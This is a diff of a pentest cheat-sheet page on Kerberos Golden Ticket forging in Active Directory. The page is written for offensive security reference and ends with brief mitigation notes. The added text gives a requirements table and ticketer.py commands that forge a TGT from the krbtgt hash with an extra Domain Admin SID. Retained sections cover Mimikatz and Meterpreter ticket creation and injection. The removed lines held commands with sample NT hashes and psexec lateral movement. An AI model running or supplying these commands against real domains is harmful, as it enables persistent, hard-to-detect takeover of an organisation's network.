@@ -41,14 +41,40 @@ While both caches serve the same basic purpose of storing Kerberos tickets to en
 
 ## Pass-the-Ticket Golden Tickets
 
-Forging a TGT require:
+A Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT) that allows an attacker to impersonate any user — including Domain Admins — on a compromised Active Directory domain.
 
-* `krbtgt` NT hash
-* since recently, we cannot use a non-existent account name as a result of `CVE-2021-42287` mitigations
+**Requirements**:
+
+| Requirement       | Description |
+| ----------------- | ----------- |
+| Domain name       | corp.local  |
+| Domain SID        | S-1-5-21-1234567890-2345678901-3456789012 |
+| KRBTGT NTLM hash  | The NTLM hash of the KRBTGT account |
+| Username          | Administrator |
+| (Optional) Groups | Add group SIDs for elevated access (e.g., Domain Admin) |
+
+As a result of `CVE-2021-42287` mitigations, the ticket cannot use a non-existent account name.
 
 > The way to forge a Golden Ticket is very similar to the Silver Ticket one. The main differences are that, in this case, no service SPN must be specified to ticketer.py, and the krbtgt NT hash must be used.
 
-### Using Mimikatz
+### Golden Ticket Creation
+
+* Using **Ticketer**
+
+```powershell
+python3 ticketer.py -nthash <KRBTGT_NTLM_HASH> \
+  -domain-sid S-1-5-21-1234567890-2345678901-3456789012 \
+  -domain corp.local Administrator
+
+python3 ticketer.py -nthash <KRBTGT_NTLM_HASH> \
+  -domain-sid S-1-5-21-1234567890-2345678901-3456789012 \
+  -domain corp.local \
+  -user-id 500 \
+  -extra-sid S-1-5-21-1234567890-2345678901-3456789012-512 \
+  Administrator
+```
+
+* Using **Mimikatz**
 
 ```powershell
 # Get info - Mimikatz
@@ -63,7 +89,7 @@ kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-20
 kerberos::tgt
 ```
 
-### Using Meterpreter
+* Using **Meterpreter**
 
 ```powershell
 # Get info - Meterpreter(kiwi)
@@ -79,35 +105,9 @@ kerberos_ticket_use /root/Downloads/pentestlabuser.tck
 kerberos_ticket_list
 ```
 
-### Using a ticket on Linux
+Golden tickets with "Enterprise admins" SID can be used cross forest boundaries.
 
-```powershell
-# Convert the ticket kirbi to ccache with kekeo
-misc::convert ccache ticket.kirbi
-
-# Alternatively you can use ticketer from Impacket
-./ticketer.py -nthash a577fcf16cfef780a2ceb343ec39a0d9 -domain-sid S-1-5-21-2972629792-1506071460-1188933728 -domain amity.local mbrody-da
-
-ticketer.py -nthash HASHKRBTGT -domain-sid SID_DOMAIN_A -domain DEV Administrator -extra-sid SID_DOMAIN_B_ENTERPRISE_519
-./ticketer.py -nthash e65b41757ea496c2c60e82c05ba8b373 -domain-sid S-1-5-21-354401377-2576014548-1758765946 -domain DEV Administrator -extra-sid S-1-5-21-2992845451-2057077057-2526624608-519
-
-export KRB5CCNAME=/home/user/ticket.ccache
-cat $KRB5CCNAME
-
-# NOTE: You may need to comment the proxy_dns setting in the proxychains configuration file
-./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
-```
-
-If you need to swap ticket between Windows and Linux, you need to convert them with `ticket_converter` or `kekeo`.
-
-```powershell
-root@kali:ticket_converter$ python ticket_converter.py velociraptor.ccache velociraptor.kirbi
-Converting ccache => kirbi
-root@kali:ticket_converter$ python ticket_converter.py velociraptor.kirbi velociraptor.ccache
-Converting kirbi => ccache
-```
-
-Mitigations:
+**Mitigations**:
 
 * Hard to detect because they are legit TGT tickets
 * Mimikatz generate a golden ticket with a life-span of 10 years
